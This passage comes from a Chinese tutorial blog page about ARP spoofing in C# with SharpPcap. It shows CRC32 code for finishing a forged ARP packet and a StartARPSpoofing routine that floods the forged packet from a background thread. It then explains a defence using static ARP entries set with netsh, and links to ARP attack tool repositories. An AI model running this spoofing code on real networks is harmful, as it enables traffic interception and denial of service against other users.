  <span class="token number">0x690ce0ee</span><span class="token punctuation">,</span> <span class="token number">0x6dcdfd59</span><span class="token punctuation">,</span> <span class="token number">0x608edb80</span><span class="token punctuation">,</span> <span class="token number">0x644fc637</span><span class="token punctuation">,</span> <span class="token number">0x7a089632</span><span class="token punctuation">,</span> <span class="token number">0x7ec98b85</span><span class="token punctuation">,</span> <span class="token number">0x738aad5c</span><span class="token punctuation">,</span> <span class="token number">0x774bb0eb</span><span class="token punctuation">,</span>

  <span class="token number">0x4f040d56</span><span class="token punctuation">,</span> <span class="token number">0x4bc510e1</span><span class="token punctuation">,</span> <span class="token number">0x46863638</span><span class="token punctuation">,</span> <span class="token number">0x42472b8f</span><span class="token punctuation">,</span> <span class="token number">0x5c007b8a</span><span class="token punctuation">,</span> <span class="token number">0x58c1663d</span><span class="token punctuation">,</span> <span class="token number">0x558240e4</span><span class="token punctuation">,</span> <span class="token number">0x51435d53</span><span class="token punctuation">,</span>

  <span class="token number">0x251d3b9e</span><span class="token punctuation">,</span> <span class="token number">0x21dc2629</span><span class="token punctuation">,</span> <span class="token number">0x2c9f00f0</span><span class="token punctuation">,</span> <span class="token number">0x285e1d47</span><span class="token punctuation">,</span> <span class="token number">0x36194d42</span><span class="token punctuation">,</span> <span class="token number">0x32d850f5</span><span class="token punctuation">,</span> <span class="token number">0x3f9b762c</span><span class="token punctuation">,</span> <span class="token number">0x3b5a6b9b</span><span class="token punctuation">,</span>

  <span class="token number">0x0315d626</span><span class="token punctuation">,</span> <span class="token number">0x07d4cb91</span><span class="token punctuation">,</span> <span class="token number">0x0a97ed48</span><span class="token punctuation">,</span> <span class="token number">0x0e56f0ff</span><span class="token punctuation">,</span> <span class="token number">0x1011a0fa</span><span class="token punctuation">,</span> <span class="token number">0x14d0bd4d</span><span class="token punctuation">,</span> <span class="token number">0x19939b94</span><span class="token punctuation">,</span> <span class="token number">0x1d528623</span><span class="token punctuation">,</span>

  <span class="token number">0xf12f560e</span><span class="token punctuation">,</span> <span class="token number">0xf5ee4bb9</span><span class="token punctuation">,</span> <span class="token number">0xf8ad6d60</span><span class="token punctuation">,</span> <span class="token number">0xfc6c70d7</span><span class="token punctuation">,</span> <span class="token number">0xe22b20d2</span><span class="token punctuation">,</span> <span class="token number">0xe6ea3d65</span><span class="token punctuation">,</span> <span class="token number">0xeba91bbc</span><span class="token punctuation">,</span> <span class="token number">0xef68060b</span><span class="token punctuation">,</span>

  <span class="token number">0xd727bbb6</span><span class="token punctuation">,</span> <span class="token number">0xd3e6a601</span><span class="token punctuation">,</span> <span class="token number">0xdea580d8</span><span class="token punctuation">,</span> <span class="token number">0xda649d6f</span><span class="token punctuation">,</span> <span class="token number">0xc423cd6a</span><span class="token punctuation">,</span> <span class="token number">0xc0e2d0dd</span><span class="token punctuation">,</span> <span class="token number">0xcda1f604</span><span class="token punctuation">,</span> <span class="token number">0xc960ebb3</span><span class="token punctuation">,</span>

  <span class="token number">0xbd3e8d7e</span><span class="token punctuation">,</span> <span class="token number">0xb9ff90c9</span><span class="token punctuation">,</span> <span class="token number">0xb4bcb610</span><span class="token punctuation">,</span> <span class="token number">0xb07daba7</span><span class="token punctuation">,</span> <span class="token number">0xae3afba2</span><span class="token punctuation">,</span> <span class="token number">0xaafbe615</span><span class="token punctuation">,</span> <span class="token number">0xa7b8c0cc</span><span class="token punctuation">,</span> <span class="token number">0xa379dd7b</span><span class="token punctuation">,</span>

  <span class="token number">0x9b3660c6</span><span class="token punctuation">,</span> <span class="token number">0x9ff77d71</span><span class="token punctuation">,</span> <span class="token number">0x92b45ba8</span><span class="token punctuation">,</span> <span class="token number">0x9675461f</span><span class="token punctuation">,</span> <span class="token number">0x8832161a</span><span class="token punctuation">,</span> <span class="token number">0x8cf30bad</span><span class="token punctuation">,</span> <span class="token number">0x81b02d74</span><span class="token punctuation">,</span> <span class="token number">0x857130c3</span><span class="token punctuation">,</span>

  <span class="token number">0x5d8a9099</span><span class="token punctuation">,</span> <span class="token number">0x594b8d2e</span><span class="token punctuation">,</span> <span class="token number">0x5408abf7</span><span class="token punctuation">,</span> <span class="token number">0x50c9b640</span><span class="token punctuation">,</span> <span class="token number">0x4e8ee645</span><span class="token punctuation">,</span> <span class="token number">0x4a4ffbf2</span><span class="token punctuation">,</span> <span class="token number">0x470cdd2b</span><span class="token punctuation">,</span> <span class="token number">0x43cdc09c</span><span class="token punctuation">,</span>

  <span class="token number">0x7b827d21</span><span class="token punctuation">,</span> <span class="token number">0x7f436096</span><span class="token punctuation">,</span> <span class="token number">0x7200464f</span><span class="token punctuation">,</span> <span class="token number">0x76c15bf8</span><span class="token punctuation">,</span> <span class="token number">0x68860bfd</span><span class="token punctuation">,</span> <span class="token number">0x6c47164a</span><span class="token punctuation">,</span> <span class="token number">0x61043093</span><span class="token punctuation">,</span> <span class="token number">0x65c52d24</span><span class="token punctuation">,</span>

  <span class="token number">0x119b4be9</span><span class="token punctuation">,</span> <span class="token number">0x155a565e</span><span class="token punctuation">,</span> <span class="token number">0x18197087</span><span class="token punctuation">,</span> <span class="token number">0x1cd86d30</span><span class="token punctuation">,</span> <span class="token number">0x029f3d35</span><span class="token punctuation">,</span> <span class="token number">0x065e2082</span><span class="token punctuation">,</span> <span class="token number">0x0b1d065b</span><span class="token punctuation">,</span> <span class="token number">0x0fdc1bec</span><span class="token punctuation">,</span>

  <span class="token number">0x3793a651</span><span class="token punctuation">,</span> <span class="token number">0x3352bbe6</span><span class="token punctuation">,</span> <span class="token number">0x3e119d3f</span><span class="token punctuation">,</span> <span class="token number">0x3ad08088</span><span class="token punctuation">,</span> <span class="token number">0x2497d08d</span><span class="token punctuation">,</span> <span class="token number">0x2056cd3a</span><span class="token punctuation">,</span> <span class="token number">0x2d15ebe3</span><span class="token punctuation">,</span> <span class="token number">0x29d4f654</span><span class="token punctuation">,</span>

  <span class="token number">0xc5a92679</span><span class="token punctuation">,</span> <span class="token number">0xc1683bce</span><span class="token punctuation">,</span> <span class="token number">0xcc2b1d17</span><span class="token punctuation">,</span> <span class="token number">0xc8ea00a0</span><span class="token punctuation">,</span> <span class="token number">0xd6ad50a5</span><span class="token punctuation">,</span> <span class="token number">0xd26c4d12</span><span class="token punctuation">,</span> <span class="token number">0xdf2f6bcb</span><span class="token punctuation">,</span> <span class="token number">0xdbee767c</span><span class="token punctuation">,</span>

  <span class="token number">0xe3a1cbc1</span><span class="token punctuation">,</span> <span class="token number">0xe760d676</span><span class="token punctuation">,</span> <span class="token number">0xea23f0af</span><span class="token punctuation">,</span> <span class="token number">0xeee2ed18</span><span class="token punctuation">,</span> <span class="token number">0xf0a5bd1d</span><span class="token punctuation">,</span> <span class="token number">0xf464a0aa</span><span class="token punctuation">,</span> <span class="token number">0xf9278673</span><span class="token punctuation">,</span> <span class="token number">0xfde69bc4</span><span class="token punctuation">,</span>

  <span class="token number">0x89b8fd09</span><span class="token punctuation">,</span> <span class="token number">0x8d79e0be</span><span class="token punctuation">,</span> <span class="token number">0x803ac667</span><span class="token punctuation">,</span> <span class="token number">0x84fbdbd0</span><span class="token punctuation">,</span> <span class="token number">0x9abc8bd5</span><span class="token punctuation">,</span> <span class="token number">0x9e7d9662</span><span class="token punctuation">,</span> <span class="token number">0x933eb0bb</span><span class="token punctuation">,</span> <span class="token number">0x97ffad0c</span><span class="token punctuation">,</span>

  <span class="token number">0xafb010b1</span><span class="token punctuation">,</span> <span class="token number">0xab710d06</span><span class="token punctuation">,</span> <span class="token number">0xa6322bdf</span><span class="token punctuation">,</span> <span class="token number">0xa2f33668</span><span class="token punctuation">,</span> <span class="token number">0xbcb4666d</span><span class="token punctuation">,</span> <span class="token number">0xb8757bda</span><span class="token punctuation">,</span> <span class="token number">0xb5365d03</span><span class="token punctuation">,</span> <span class="token number">0xb1f740b4</span>

<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 计算CRC32码</span>
<span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">uint</span></span> <span class="token function">GetCRC32</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> bytes<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token class-name"><span class="token keyword">uint</span></span> iCount <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">uint</span><span class="token punctuation">)</span>bytes<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>
	<span class="token class-name"><span class="token keyword">uint</span></span> crc <span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">uint</span></span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> iCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		crc <span class="token operator">=</span> <span class="token punctuation">(</span>crc <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">^</span> crcTable<span class="token punctuation">[</span><span class="token punctuation">(</span>crc <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">^</span> bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> crc<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后将计算得出的CRC32码粘到构造好的包尾就可以了。</p><div class="language-csharp line-numbers-mode" data-ext="cs"><pre class="language-csharp"><code><span class="token comment">//计算CRC32校验码</span>
<span class="token class-name">UInt32</span> u <span class="token operator">=</span> <span class="token function">GetCRC32</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> crc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span></span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">//Uint转Byte[4] CRC32 is Unit To Byte[4]</span>
crc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>u <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
crc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>u <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
crc<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>u <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
crc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//填充FCS校验位</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> crc<span class="token punctuation">.</span>Length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	p1<span class="token punctuation">[</span>p1<span class="token punctuation">.</span>Length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> crc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">return</span> p1<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>到此，ARP数据包的构造就算完成了。</p><p>最后要实现ARP的欺骗，只要利用SharpPacp提供的发包方法，在线程中疯狂发包就可以了。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/// &amp;lt;summary&amp;gt;
/// arp欺骗：对内网PC进行欺骗
/// &amp;lt;/summary&amp;gt;
/// &amp;lt;param name=&quot;getwayIP&quot;&amp;gt;&amp;lt;/param&amp;gt;
/// &amp;lt;param name=&quot;wrongMac&quot;&amp;gt;&amp;lt;/param&amp;gt;
/// &amp;lt;param name=&quot;destIP&quot;&amp;gt;&amp;lt;/param&amp;gt;
/// &amp;lt;param name=&quot;destMac&quot;&amp;gt;&amp;lt;/param&amp;gt;
public void StartARPSpoofing(string senderIP, string recipientIP,string senderMAC,string recipientMAC)
{
	mIP = IPTOBYTE(recipientIP);
	sIP = IPTOBYTE(senderIP);
	mMAC = MACTOBYTE(recipientMAC);
	sMAC = MACTOBYTE(senderMAC);

	//构造ARP欺骗包
	packet = getPacket(sIP, mIP, sMAC, mMAC);

	//初始化发包线程
	sendThread = new Thread(SendPack);
	//启动线程
	sendThread.Start();
}
/// &amp;lt;summary&amp;gt;
/// 发送数据
/// &amp;lt;/summary&amp;gt;
public void SendPack()
{
	_device.Open();
	var timeoutDateTime = DateTime.Now + timeout;

	//发送数据包
	while (true)
	{
		_device.SendPacket(packet);
		time++;
		// 通知事件 -更新发包次数
		if (ResolvedEvent != null)
		{
			ResolvedTimeEvent(this, time);
		}
		Thread.Sleep(100);  //线程休眠100ms
	}
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="正文-如何防御arp欺骗" tabindex="-1"><a class="header-anchor" href="#正文-如何防御arp欺骗" aria-hidden="true">#</a> 正文：如何防御ARP欺骗</h2><p>ARP欺骗是通过重复应答实现的，那么只需要在本机添加一条静态的ARP映射，这样就不需要询问网关MAC地址了，这种方法只对主机欺骗有效。对于网关欺骗还需要在网关中也添加一条到主机的静态ARP映射。 1.用管理身份运行命令提示符；输入netsh i i show in，查看一下本机有哪些网络连接</p><div class="language-Shell line-numbers-mode" data-ext="Shell"><pre class="language-Shell"><code>netsh i i show in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+b+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>2.查看一下网关的MAC地址。注意如果正遭受ARP欺骗攻击，通过此方法查处的可能是虚假的MAC地址。输入arp -a命令查询本机的arp映射表，如果找不到网关的信息，可以先ping一下网关。</p><figure><img src="'+m+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>3.输入：netsh -c &quot;i i&quot; add neighbors 连接的Idx号 网关IP 网关MAC 添加一条静态映射,我已经添加过了，所以会显示 对象已存在</p><div class="language-csharp line-numbers-mode" data-ext="cs"><pre class="language-csharp"><code>netsh <span class="token operator">-</span>c <span class="token string">&quot;i i&quot;</span> <span class="token keyword">add</span> neighbors 连接的Idx号 网关IP 网关MAC
netsh <span class="token operator">-</span>c <span class="token string">&quot;i i&quot;</span> <span class="token keyword">add</span> neighbors <span class="token number">9</span> <span class="token number">10.60</span><span class="token number">.12</span><span class="token number">.1</span> 4c<span class="token operator">-</span>5e<span class="token operator">-</span>0c<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span><span class="token number">73</span><span class="token operator">-</span>f5
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+v+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="参考资料" tabindex="-1"><a class="header-anchor" href="#参考资料" aria-hidden="true">#</a> 参考资料</h2>',28),A={href:"http://sharppcap.sourceforge.net/htmldocs/index.html",target:"_blank",rel:"noopener noreferrer"},C={href:"https://github.com/chmorgan/packetnet",target:"_blank",rel:"noopener noreferrer"},y={href:"https://gitee.com/week233/SharpPcapTool_back.git",target:"_blank",rel:"noopener noreferrer"},R={href:"https://gitee.com/week233/ARPAttack.git",target:"_blank",rel:"noopener noreferrer"};function w(I,_){const a=c("ExternalLinkIcon");return o(),u("div",null,[s("p",null,[s("a",f,[n("freebuf稿件"),p(a)])]),g,s("p",null,[n("代码分析： LibPcapLiveDeviceList.Instance获取本机中所有网卡的List device.Address获取房卡中所有的地址信息（包括IPv4，IPv6，MAC） Sockaddr.AddressType.AF_INET_AFINET6用于判断是不是IP地址("),s("a",h,[n("官方解释"),p(a)]),n(") Sockaddr.AddressType.AF_INET_AFINET6用于判断是不是MAC地址")]),P,s("p",null,[s("a",A,[n("SharpPcap官方文档"),p(a)]),s("a",C,[n("PacketDotNet"),p(a)]),n("（使用PacketDotNet可以很方便的构造出数据包，只需几个参数） "),s("a",y,[n("SharpPcapTool"),p(a)]),n("（大神写的局域网欺骗工具，有个大坑，没有做物理机的虚拟机网卡过滤，当遍历到虚拟机网卡的网关IP时会抛异常，因为VMware的虚拟机网卡没有网关地址） "),s("a",R,[n("牢底坐穿工具箱"),p(a)]),n("（参考了部分大神的代码，已经过滤掉了VMware的虚拟机网卡）")])])}const T=e(x,[["render",w],["__file","index.html.vue"]]);export{T as default};
